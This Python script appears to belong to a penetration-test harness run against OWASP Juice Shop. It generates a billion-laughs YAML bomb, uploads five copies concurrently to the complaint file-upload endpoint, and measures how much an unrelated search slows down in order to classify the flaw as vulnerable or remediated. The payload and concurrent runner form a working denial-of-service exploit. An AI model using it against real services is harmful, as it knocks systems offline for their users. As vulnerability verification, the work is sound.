#!/usr/bin/env python3
"""pt27: concurrent YAML-bomb uploads to POST /file-upload cause a real,
shared-event-loop denial of service, not just one slow request.

Found black-box: the complaint page accepts a .yml/.yaml attachment with
no login. A single billion-laughs-style YAML (nested anchor/alias
expansion) takes about 2 seconds and gets cut off by a server-side vm
timeout (confirmed live, and Juice Shop's own scoreboard flips
yamlBombChallenge from it). Firing five of these at once from one
caller, though, measurably stalls an unrelated request: a plain
product search that normally answers in well under a second took
nearly 10 seconds while the bombs were parsing. The per-request timeout
caps one request's cost; nothing caps how many a single caller can run
in parallel.

Corroborated against routes/fileUpload.ts: handleYamlUpload runs
yaml.load() inside a vm.runInContext with a 2000ms timeout, no
concurrency or rate limiting of any kind around it.

Standard library only (urllib, threading).
"""

from __future__ import annotations

import argparse
import json
import sys
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt27-001.json"
BOMB_COUNT = 5
SLOWDOWN_THRESHOLD_SECONDS = 1.5
SLOWDOWN_FACTOR = 3.0


def _yaml_bomb() -> bytes:
    lines = ['a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]']
    prev = "a"
    for letter in "bcdefghi":
        lines.append(f"{letter}: &{letter} [*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev}]")
        prev = letter
    return ("\n".join(lines) + "\n").encode()


def _upload_yaml_bomb(target: str) -> int:
    boundary = "----flatlinept27"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="bomb.yml"\r\n'
        "Content-Type: application/x-yaml\r\n\r\n"
    ).encode() + _yaml_bomb() + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(f"{target}/file-upload", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code
    except Exception:
        return 0


def _upload_plain_pdf(target: str) -> int:
    boundary = "----flatlinept27pdf"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="invoice.pdf"\r\n'
        "Content-Type: application/pdf\r\n\r\n"
        "%PDF-1.4 flatline pt27 legitimate complaint attachment\n"
    ).encode() + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(f"{target}/file-upload", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code


def _timed_get(target: str, path: str) -> float:
    t0 = time.monotonic()
    try:
        urllib.request.urlopen(f"{target}{path}", timeout=15).read()
    except Exception:
        pass
    return time.monotonic() - t0


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)

    baseline_seconds = _timed_get(target, "/rest/products/search?q=juice")

    bomb_statuses: list[int] = []
    threads = [threading.Thread(target=lambda: bomb_statuses.append(_upload_yaml_bomb(target))) for _ in range(BOMB_COUNT)]
    for t in threads:
        t.start()
    time.sleep(0.2)  # let the bombs start parsing before measuring
    under_load_seconds = _timed_get(target, "/rest/products/search?q=juice")
    for t in threads:
        t.join()

    slowdown_factor = (under_load_seconds / baseline_seconds) if baseline_seconds > 0 else float("inf")
    significant_slowdown = under_load_seconds > SLOWDOWN_THRESHOLD_SECONDS and slowdown_factor > SLOWDOWN_FACTOR

    blocked_count = sum(1 for s in bomb_statuses if s == 429)

    if significant_slowdown and blocked_count == 0:
        status = "VULNERABLE"
        summary = f"Legitimate request went from {baseline_seconds:.2f}s baseline to {under_load_seconds:.2f}s under {BOMB_COUNT} concurrent YAML-bomb uploads ({slowdown_factor:.1f}x), none blocked."
    elif not significant_slowdown and blocked_count > 0:
        status = "REMEDIATED"
        summary = f"{blocked_count}/{BOMB_COUNT} bomb uploads were blocked (HTTP 429) before parsing; legitimate request stayed at {under_load_seconds:.2f}s vs {baseline_seconds:.2f}s baseline."
    else:
        status = "ERROR"
        summary = f"Inconclusive: baseline={baseline_seconds:.2f}s, under_load={under_load_seconds:.2f}s, bomb_statuses={bomb_statuses}."

    plain_pdf_status = _upload_plain_pdf(target)
    legitimate_plain_upload_ok = plain_pdf_status == 204

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "baseline_seconds": round(baseline_seconds, 3),
        "under_load_seconds": round(under_load_seconds, 3),
        "slowdown_factor": round(slowdown_factor, 2),
        "bomb_statuses": bomb_statuses,
        "blocked_count": blocked_count,
        "summary": summary,
        "legitimate_plain_upload_ok": legitimate_plain_upload_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt27-yaml-bomb-dos", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
